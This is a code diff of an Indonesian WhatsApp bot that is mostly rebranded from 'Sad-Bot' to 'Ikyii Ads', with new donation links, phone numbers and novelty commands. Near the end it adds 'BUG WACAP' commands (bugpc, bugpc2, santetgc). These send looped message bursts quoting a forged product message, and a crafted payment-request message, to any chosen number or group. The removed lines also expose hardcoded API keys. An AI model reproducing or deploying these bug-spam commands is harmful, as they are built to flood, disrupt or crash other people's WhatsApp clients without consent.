@@ -10,7 +10,7 @@ Kalau Sampai Ketemu Lagi Creator Bot
 Yg Reupload Tanpa Kasih Cr 
 Sc Akan Saya Encode
 
-Base : Hisoka
+Base : papah
 Recode : NazeDev & Papah-Chan ( Nama Lu )
 
 **/
@@ -51,7 +51,7 @@ const hariiini = moment.tz('Asia/Jakarta').format('DD MMMM YYYY')
 const barat = moment.tz('Asia/Jakarta').format('HH:mm:ss')
 const tengah = moment.tz('Asia/Makassar').format('HH:mm:ss')
 const timur = moment.tz('Asia/Jayapura').format('HH:mm:ss')
-const nyoutube = ('© Papah\nYoutube :\nhttps://bit.ly/Papah-Chan')  //ubah di config biar ngk emror
+const nyoutube = ('© Ikyii\nInstagram :\nhttps://Instagram.com/ikiyyye')  //ubah di config biar ngk emror
 const ini_mark = `0@s.whatsapp.net`
 const ownernya = ownernomer + '@s.whatsapp.net'
 global.prem = require("./lib/premium")
@@ -182,14 +182,14 @@ module.exports = papah = async (papah, m, chatUpdate, store) => {
 	    if (setting) {
 		if (!isNumber(setting.status)) setting.status = 0
         if (!('anticall' in setting)) setting.anticall = true
-		if (!('autobio' in setting)) setting.autobio = true
+		if (!('autobio' in setting)) setting.autobio = false
 		if (!('templateImage' in setting)) setting.templateImage = true
 		if (!('templateVideo' in setting)) setting.templateVideo = false
 		if (!('templateGif' in setting)) setting.templateGif = false
 		if (!('templateMsg' in setting)) setting.templateMsg = false	
 	    } else global.db.data.settings[botNumber] = {
 		status: 0,
-		autobio: true,
+		autobio: false,
 		templateImage: true,
 		templateVideo: false,
 		templateGif: false,
@@ -255,7 +255,7 @@ const sendStickerFromUrl = async(to, url) => {
 		const fdoc = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {documentMessage: {title: `${ytname}`,jpegThumbnail: await reSize(thumb, 100, 100)}}}
 		const fvn = {key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {})},message: { "audioMessage": {"mimetype":"audio/ogg; codecs=opus","seconds":359996400,"ptt": "true"}} } 
 		const ftextt = {key: {fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {})}, message: { "extendedTextMessage": {"text":`${ytname}`, "title": `${botname}`, 'jpegThumbnail': await reSize(thumb, 100, 100)}}}
-        const ftoko = {key: {fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? {remoteJid: "status@broadcast" } : {})}, message: { "productMessage": { "product": { "productImage":{ "mimetype": "image/jpeg", "jpegThumbnail": await reSize(thumb, 100, 100)},"title": `${ytname}`, "description": `${botname}`, "currencyCode": "IDR", "priceAmount1000": "1000000000000000000", "retailerId": `${ytname}`, "productImageCount": 1}, "businessOwnerJid": `0@s.whatsapp.net`}}} 
+        const ftoko = {key: {fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? {remoteJid: "status@broadcast" } : {})}, message: { "productMessage": { "product": { "productImage":{ "mimetype": "image/jpeg", "jpegThumbnail": await reSize(thumb, 100, 100)},"title": `${ytname}`, "description": `${botname}`, "currencyCode": "IDR", "priceAmount1000": "100", "retailerId": `${ytname}`, "productImageCount": 1}, "businessOwnerJid": `0@s.whatsapp.net`}}} 
 		const fgif = {key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {})},message: {"videoMessage": { "title":`${ytname}`, "h": `Hmm`,'seconds': '359996400', 'gifPlayback': 'true', 'caption': `${ytname}`, 'jpegThumbnail': await reSize(thumb, 100, 100)}}}
 		const fgclink = {key: {participant: "0@s.whatsapp.net","remoteJid": "0@s.whatsapp.net"},"message": {"groupInviteMessage": {"groupJid": "6288213840883-1616169743@g.us","inviteCode": "m","groupName": `${ytname}`, "caption": `${ytname}`, 'jpegThumbnail': await reSize(thumb, 100, 100)}}}
 		const fvideo = {key: { fromMe: false,participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {}) },message: { "videoMessage": { "title":`${ytname}`, "h": `Hmm`,'seconds': '359996400', 'caption': `${ytname}`, 'jpegThumbnail': await reSize(thumb, 100, 100)}}}
@@ -289,7 +289,7 @@ jumlahharian = `${dataa.value}`
 	    let setting = global.db.data.settings[botNumber]
 	    if (new Date() * 1 - setting.status > 1000) {
 		let uptime = await runtime(process.uptime())
-		await papah.setStatus(`Sad-Bot | Runtime : ${runtime(uptime)}`)
+		await papah.setStatus(`${papah.user.name} | Runtime : ${runtime(uptime)}`)
 		setting.status = new Date() * 1
 	    }
 	}
@@ -432,6 +432,19 @@ ${Array.from(room.jawaban, (jawaban, index) => {
                 delete tebaktebakan[m.sender.split('@')[0]]
             } else m.reply('*Jawaban Salah!*')
         }
+        
+        const reply = (teks) => {
+          
+            var ids = teks.includes('@') ? teks.split('@'): []
+          
+            let semdertag = []
+            for (var con of ids) {
+           semdertag.push(con.split(' ')[0]+'@s.whatsapp.net')
+            }
+            papah.sendMessage(m.chat, {text:teks},  {
+           quoted: m, thumbnail: fs.readFileSync('./lib/hisoka.jpg'), contextInfo: {
+          mentionedJid: semdertag }});
+          }
         
         //TicTacToe
 	    this.game = this.game ? this.game : {}
@@ -976,6 +989,20 @@ break
                     papah.sendMessage(m.chat, { text: `Rate Bot : *${te}%*` }, { quoted: m })
                     }
 					break
+			case 'ganteng': case 'gantengcek': case 'handsome': case 'handsomecheck': {
+				    if (!text) return replay(`Tag Someone, Example : ${prefix + command} papah`)
+					const ra = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
+					const te = ra[Math.floor(Math.random() * ra.length)]
+                    papah.sendMessage(m.chat, { text: `Cek Ganteng : ${text}\nRate Bot : *${te}%*` }, { quoted: m })
+                    }
+					break
+			case 'cantik': case 'cantikcek': case 'beautiful': case 'beautifulcheck': {
+				    if (!text) return replay(`Tag Someone, Example : ${prefix + command} papah`)
+					const ra = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
+					const te = ra[Math.floor(Math.random() * ra.length)]
+                    papah.sendMessage(m.chat, { text: `Cek Cantik : ${text}\nRate Bot : *${te}%*` }, { quoted: m })
+                    }
+					break
 			case 'tanyakerang': case 'kerangajaib': case 'kerang': {
 				if (!text) throw `Example : ${prefix + command} saya menang?`
 				let krng = ['Mungkin suatu hari', 'Tidak juga', 'Tidak keduanya', 'Kurasa tidak', 'Ya', 'Tidak', 'Coba tanya lagi', 'Tidak ada']
@@ -1002,11 +1029,11 @@ break
             }
             break
             case 'donasi': case 'sewabot': case 'sewa': case 'buypremium': case 'donate': {
-                papah.sendMessage(m.chat, { image: fs.readFileSync('./media/image/papah.jpg'), caption: `*${ucapanWaktu} Kak ${m.pushName}*\n\n *Jika ingin berdonasi silahkan scan gambar diatas*\n\n*Jika ingin sewa bot atau premium*\n*Silahkan Chat Owner*\n\n*Atau klik link dibawah ini*\n_https://saweria.co/papah_\n\n*Atau Transfer via*\n- *Gopay Dana Ovo Qris ShopeePay*\n Ke nomer berikut : 0895612153565\n\n_Terima kasih_` }, { quoted: m })
+                papah.sendMessage(m.chat, { image: fs.readFileSync('./media/image/papah.jpg'), caption: `*${ucapanWaktu} Kak ${m.pushName}*\n\n *Jika ingin berdonasi silahkan scan gambar diatas*\n\n*Jika ingin sewa bot atau premium*\n*Silahkan Chat Owner*\n\n*Atau klik link dibawah ini*\n_https://saweria.co/Ikiyyads\n\n*Atau Transfer via*\n- *Gopay Dana Ovo Qris ShopeePay*\n Ke nomer berikut : 085215319934\n\n_Terima kasih_` }, { quoted: m })
             }
             break
             case 'sc': {
-                m.reply('https://wa.me/6282287219167')
+                m.reply('https://wa.me/6285215319934')
             }
             break		 
             case 'subsyt': {
@@ -1023,7 +1050,7 @@ break
   buttons: buttons,
   headerType: 4,
   contextInfo:{externalAdReply:{
-  title: 'Sad-Bot',
+  title: 'Ikyii Ads',
   body: 'Subscribe My YouTube', 
   showAdAttribution: true,
   thumbnail: thumb,
@@ -1045,8 +1072,8 @@ break
 			break
             case 'runtime': case 'tes': {
             	let lowq = `*Bot Telah Online Selama*\n*${runtime(process.uptime())}*`
-                papah.sendMessage(m.chat, { text: lowq }, {quoted: ftoko})
-                papah.setStatus(`Sad-Bot | Runtime : ${runtime(process.uptime())}`)
+                papah.sendMessage(m.chat, { text: lowq }, {quoted: fkontak})
+                papah.setStatus(`${papah.user.name} | Runtime : ${runtime(process.uptime())}`)
             	}
             break
             case 'req': case 'request': {
@@ -1257,11 +1284,11 @@ m.reply(`*Nomor wa.me/${prmin} telah di unban !*`)
                 await papah.groupUpdateDescription(m.chat, text).then((res) => m.reply(mess.success)).catch((err) => m.reply(jsonformat(err)))
             }
             break
-            case 'setppbot': case 'setbotpp':{
-                if (!isCreator) m.reply(mess.owner)
-                if (!quoted) m.reply `Send/Reply Image With Caption ${command}`
-                if (!/image/.test(mime)) reply `Send/Reply Image With Caption ${command}`
-                if (/webp/.test(mime)) reply `Send/Reply Image With Caption ${command}`
+          case 'setppbot': {
+                if (!isCreator) throw mess.owner
+                if (!quoted) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
+                if (!/image/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
+                if (/webp/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
                 let media = await papah.downloadAndSaveMediaMessage(quoted)
                 await papah.updateProfilePicture(botNumber, { url: media }).catch((err) => fs.unlinkSync(media))
                 m.reply(mess.success)
@@ -1647,16 +1674,6 @@ m.reply(`Mengirim Broadcast Ke ${anu.length} Chat\nWaktu Selesai ${anu.length * 
 		m.reply('Sukses Broadcast')
 }
 break
-
-case 'getcase':
-if (!isCreator) return m.reply(mess.owner)
-if (args.length < 1) return m.reply ("*Mau nyari case apa*") 
-const getCase = (cases) => {
-return "case"+`'${cases}'`+fs.readFileSync("papah.js").toString().split('case \''+cases+'\'')[1].split("break")[0]+"break"
-}
-m.reply (`${getCase(q)}`)
-break
-
 case 'infochat': {
 if (!m.quoted) m.reply('Reply Pesan')
 let msg = await m.getQuotedObj()
@@ -2519,7 +2536,7 @@ case 'test':
 ]
 const pahh = {
 text: `Total Hit : ${totalhit}\nHit Today : ${totalhittd}`,
-footer: `© Sad-Bot`,
+footer: `© Ikyii Ads`,
 buttons: buttons5,
 headerType: 1
 }
@@ -2539,7 +2556,7 @@ let buttonMessage = {
     caption: `*「 GIMAGE SEARCH 」*
  *Query* : ${text}
  *Media Url* : ${images}`,
-    footer: ` © Sad-Bot`,
+    footer: ` © Ikyii Ads`,
     buttons: buttons,
     headerType: 4
 }
@@ -2787,14 +2804,6 @@ break
                 papah.sendMessage(m.chat, { image: { url: random.female }, caption: `Couple Female` }, { quoted: m })
             }
 	    break
-        case 'couple': case 'ppcp':{
-            m.reply(mess.wait)
-                            let anu = await fetchJson('https://raw.githubusercontent.com/iamriz7/kopel_/main/kopel.json')
-                            let random = anu[Math.floor(Math.random() * anu.length)]
-                            papah.sendMessage(m.chat, { image: { url: random.male }, caption: `Couple Male` }, { quoted: m })
-                            papah.sendMessage(m.chat, { image: { url: random.female }, caption: `Couple Female` }, { quoted: m })
-                        }
-                    break
             case 'coffe': case 'kopi': {
             let buttons = [
                     {buttonId: `coffe`, buttonText: {displayText: 'Next Image'}, type: 1}
@@ -2837,7 +2846,7 @@ break
             break
             case 'gcsearch': {
             	try {
-            	if (!text) return m.reply(`Example :\n${prefix}searchgc Classy Editor`)
+            	if (!text) return m.replay(`Example :\n${prefix}searchgc Classy Editor`)
                 nae = args.join(" ")
                 hx.linkwa(nae).then(res => {
                 teks = '```「 Search Group 」```'
@@ -3413,7 +3422,7 @@ require('./lib/tiktok').Tiktok(q).then( data => {
         {buttonId: `tiktoknowm ${q}`, buttonText: {displayText: '► No Watermark'}, type: 1},
         {buttonId: `tiktokmp3 ${q}`, buttonText: {displayText: '♫ Audio'}, type: 1}
     ]
-papah.sendMessage(m.chat, { caption: 'Kamu bisa mengubahnya menjadi Vidio Tanpa Watermark atau Audio, pencet tombol dibawah untuk mengubahnya!', video: { url: data.watermark }, buttons: buttons, footer: `© Sad-Bot`, mentions: [sender] })
+papah.sendMessage(m.chat, { caption: 'Kamu bisa mengubahnya menjadi Vidio Tanpa Watermark atau Audio, pencet tombol dibawah untuk mengubahnya!', video: { url: data.watermark }, buttons: buttons, footer: `© Ikyii Ads`, mentions: [sender] })
 })
 }
 break
@@ -3482,25 +3491,7 @@ break
                 result = anu[Math.floor(Math.random() * anu.length)]
                 papah.sendMessage(m.chat, { image: { url: result }, fileLength: jumlah, caption: `Media Url :\n`+result}, { quoted: fkontak })
             }
-            case 'ip':
-                m.reply(mess.wait)
-                const dripsba = {
-                  method: 'GET',
-                  url: 'https://find-any-ip-address-or-domain-location-world-wide.p.rapidapi.com/iplocation',
-                  qs: {apikey: '873dbe322aea47f89dcf729dcc8f60e8'},
-                  headers: {
-                    'X-RapidAPI-Key': '837661b454msh274b6753ca80823p11c653jsn973bb2a55a34',
-                    'X-RapidAPI-Host': 'find-any-ip-address-or-domain-location-world-wide.p.rapidapi.com',
-                    useQueryString: true
-                  }
-                };
-                let bhudhi = require('request')
-                bhudhi(dripsba, function (error, response, body) {
-                  if (error) throw new Error(error);
-                  m.reply(body);
-                  console.log(body);
-                });
-          break
+            break
 case 'cnn-news': 
 CNNNews().then(res => {
 no = 0
@@ -4021,22 +4012,12 @@ let capt = `⭔ Title: ${judul}
             papah.sendImage(m.chat, res.result[0].thumbnail, capt, m)
             }
             break
-            case 'goblokcek': case 'jelekcek': case 'rate':case 'haram':case 'gaycek':
-                case 'lesbicek':case 'gantengcek': case 'cantikcek':case 'begocek': case 'suhucek':case 'pintercek':
-                case 'jagocek':case 'nolepcek':case 'babicek':case 'bebancek':case 'baikcek':
-                case 'jahatcek':case 'anjingcek':case 'haramcek':case 'pakboycek':
-                case 'pakgirlcek':case 'sangecek': case 'bapercek':case 'fakboycek':case 'alimcek':case 'suhucek':
-                case 'fakgirlcek':case 'kerencek':case 'wibucek':case 'pasarkascek':
-                cantik = body.slice(1)
-                const eyy =['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
-                const yn = eyy[Math.floor(Math.random() * eyy.length)]
-                papah.sendMessage(m.chat, { text: yn }, { quoted: m })
-                break
+
 //PEMBATAS Menu=======================================
             case 'rules': {
 rules = `*Rules BOT*
 
-Sad-Bot merupakan sebuah Robot WhatsApp yang diprogram untuk melakukan perintah tertentu secara otomatis.
+Ikyii Ads merupakan sebuah Robot WhatsApp yang diprogram untuk melakukan perintah tertentu secara otomatis.
 Setiap respon atau balasan yang dilakukan oleh bot bukan dari Manusia.
 
 Dengan memakai bot ini maka kamu *setuju* dengan syarat dan kondisi sbg berikut:
@@ -4077,7 +4058,6 @@ let alfamart = `628111500959@s.whatsapp.net`
             }
             break
             case 'menu': {
-                papah_dev = await getBuffer(`https://github.com/DGXeon/Tiktokmusic-API/raw/master/tiktokmusic/sound50.mp3`)
             let ownernya = ownernomer + '@s.whatsapp.net'
             let me = m.sender
             let jawab = `*${ucapanWaktu}*
@@ -4106,10 +4086,29 @@ let alfamart = `628111500959@s.whatsapp.net`
 ╰──❍`
             let ments = [ownernya, me, ini_mark]
             let buttons = [{ buttonId: 'allmenu', buttonText: { displayText: '📖List Menu' }, type: 1 },{ buttonId: 'rules', buttonText: { displayText: '❗Rules' }, type: 1 },{ buttonId: 'donasi', buttonText: { displayText: '🙏Donasi' }, type: 1 }]
-
-  papah.sendButtonText(m.chat, buttons, jawab, nyoutube, fkontak, {mentions: ments})
-  papah.sendMessage(m.chat, { audio: papah_dev, mimetype: 'audio/mp4', ptt: true }, { quoted: fkontak })    
+            let buttonMessage = {
+  document: fs.readFileSync('./media/doc/fake.pdf'),
+  fileName : akulaku + (` | Halo ${pushname}`),
+  mimetype: `${filsk}`,
+  fileLength: '100',
+  pageCount: '100',
+  caption: jawab,
+  footer: nyoutube,
+  buttons: buttons,
+  mentions: ments,
+  headerType: 4,
+  contextInfo:{externalAdReply:{
+    tittle: 'Simple Bot Case', 
+    body: botname,
+    showAdAttribution: true,
+    thumbnail: thumb,
+    mediaType: "VIDEO",
+    mediaUrl: "https://api.zacros.my.id/randomimg/loli", 
+    sourceUrl: myyt
+  }}
 }
+  papah.sendMessage(m.chat, buttonMessage, {quoted: ftoko})
+  }
  break
             case 'simplemenu': case 'list': case 'help': {
             let ownernya = ownernomer + '@s.whatsapp.net'
@@ -4276,7 +4275,6 @@ let buttons = [{ buttonId: 'simplemenu', buttonText: { displayText: '⬅️Back'
             case 'mrandom': {
 rndom = `╭──❍ *Random Menu*
 │
-│⭔ ${prefix}ppcp
 │⭔ ${prefix}gbtku
 │⭔ ${prefix}coffe
 │⭔ ${prefix}quotesanime
@@ -4592,7 +4590,7 @@ _*🇯🇵 : このボットの機能のリスト*_.
 
 *[   INFORMATION   ]*
 _⫹⫺ Your Name : ${m.pushName}_
-_⫹⫺ Bot Name : Sad-Bot_
+_⫹⫺ Bot Name : Ikyii Ads_
 _⫹⫺ Library : Baileys-Md_
 _⫹⫺ Version : 4.0.4_
 _⫹⫺ Language : Javascript_
@@ -4712,40 +4710,6 @@ _⫹⫺ Fitur : 200_
 │⭔ ${prefix}cecanjapan
 │⭔ ${prefix}cecanthailand
 │⭔ ${prefix}cecanchina
-│
-╰────❍
-╭──❍ *Cek Menu*
-│
-│⭔ ${prefix}goblokcek 
-│⭔ ${prefix}jelekcek 
-│⭔ ${prefix}rate
-│⭔ ${prefix}haram
-│⭔ ${prefix}gaycek
-│⭔ ${prefix}lesbicek
-│⭔ ${prefix}gantengcek 
-│⭔ ${prefix}cantikcek
-│⭔ ${prefix}begocek 
-│⭔ ${prefix}suhucek
-│⭔ ${prefix}pintercek
-│⭔ ${prefix}jagocek
-│⭔ ${prefix}nolepcek
-│⭔ ${prefix}babicek
-│⭔ ${prefix}bebancek
-│⭔ ${prefix}baikcek
-│⭔ ${prefix}jahatcek
-│⭔ ${prefix}anjingcek
-│⭔ ${prefix}haramcek
-│⭔ ${prefix}pakboycek
-│⭔ ${prefix}pakgirlcek
-│⭔ ${prefix}sangecek 
-│⭔ ${prefix}bapercek
-│⭔ ${prefix}fakboycek
-│⭔ ${prefix}alimcek
-│⭔ ${prefix}suhucek
-│⭔ ${prefix}fakgirlcek
-│⭔ ${prefix}kerencek
-│⭔ ${prefix}wibucek
-│⭔ ${prefix}pasarkascek
 │
 ╰────❍
 ╭──❍ *Random Sticker*
@@ -4948,7 +4912,6 @@ _⫹⫺ Fitur : 200_
 │⭔ ${prefix}quoted
 │⭔ ${prefix}listpc
 │⭔ ${prefix}listgc
-│⭔ ${prefix}ip
 │⭔ ${prefix}listonline
 │⭔ ${prefix}speedtest
 │⭔ ${prefix}menfes 
@@ -5002,7 +4965,6 @@ _⫹⫺ Fitur : 200_
 ╰────❍
 ╭──❍ *Owner Menu*
 │
-│⭔ ${prefix}getcase
 │⭔ ${prefix}sendsesi
 │⭔ ${prefix}react [emoji]
 │⭔ ${prefix}chat [option]
@@ -5202,6 +5164,7 @@ case 'sound161':
 papah_dev = await getBuffer(`https://github.com/DGXeon/Tiktokmusic-API/raw/master/tiktokmusic/${command}.mp3`)
 await papah.sendMessage(m.chat, { audio: papah_dev, mimetype: 'audio/mp4', ptt: true }, { quoted: fkontak })     
 break
+
 case 'acumalaka':
 case 'reza-kecap':
 case 'farhan-kebab':
@@ -5212,6 +5175,64 @@ case 'siuu':
 papah_dev = await getBuffer(`https://github.com/FahriAdison/Base-Sound/raw/main/audio/${command}.mp3`)
 await papah.sendMessage(m.chat, { audio: papah_dev, mimetype: 'audio/mp4', ptt: true }, { quoted: fkontak })     
 break
+
+/*BUG WACAP */
+case 'ampas1' :
+case 'bugpc': {
+if (!isCreator) return
+
+reply('sukses send bug')
+for (let i = 0; i < 10; i++) {
+Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
+a = await papah.sendMessage(m.chat, {react: { text: " ï¸", key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
+papah.sendMessage(Pe, {text: "Assalamualaikum Paket"}, {quoted: m})
+await sleep(10)
+papah.sendMessage(Pe, {text: "Assalamualaikum Paket"}, {quoted: ftoko})
+await sleep(10)
+}
+}
+break
+//=================================================//
+/*BUG WACAP */
+case 'bugpc2' :
+case 'ampas2' : {
+if (!isCreator) return
+Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@g.us"
+a = await papah.sendMessage(m.chat, {react: { text: " ï¸", key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
+papah.sendMessage(Pe, {text: "assalamualaikum"}, {quoted: m})
+await sleep(20)
+papah.sendMessage(Pe, {text: "assalamualaikum"}, {quoted: m})
+await sleep(20)
+papah.sendMessage(Pe, {text: "Xd"}, {quoted: ftoko})
+await sleep(20)
+papah.sendMessage(Pe, {text: "Xd"}, {quoted: ftoko})
+await sleep(20)
+papah.sendMessage(Pe, {text: "Xd"}, {quoted: ftoko})
+await sleep(10000)
+}
+break
+                      case 'santetgc': {
+
+if (args.length < 1) return reply(`*Syntax Error!*\n\nUse : ${command} idGroup|amount spam|timer\nExample : ${command} 62888@g.us|1|10s\n\n\ns = Second/Detik\n\nDi Usahakan Bot Udah Masuk Group Nya`)
+num = q.split('|')[0]
+jumlah = q.split('|')[1]
+for (let i = 0; i < 1; i++) {
+reply(`Baiklah Tuan`)
+var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./lib/papah.jpg') }, { upload: papah.waUploadToServer })
+var requestPaymentMessage = generateWAMessageFromContent(num, proto.Message.fromObject({
+"requestPaymentMessage": {
+"currencyCodeIso4217": "IDR",
+"amount1000": "100",
+"extendedTextMessage": {
+"text": `MY DEVELOPER IKY MODS WA`,
+}
+}}), { userJid: m.chat, quoted: ftoko })
+papah.relayMessage(num, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
+}
+
+}
+break
+
             default:
                 if (budy.startsWith('=>')) {
                     if (!isCreator) return m.reply(mess.owner)
@@ -5290,4 +5311,4 @@ fs.watchFile(file, () => {
 	console.log(chalk.redBright(`Update ${__filename}`))
 	delete require.cache[file]
 	require(file)
-}
+})
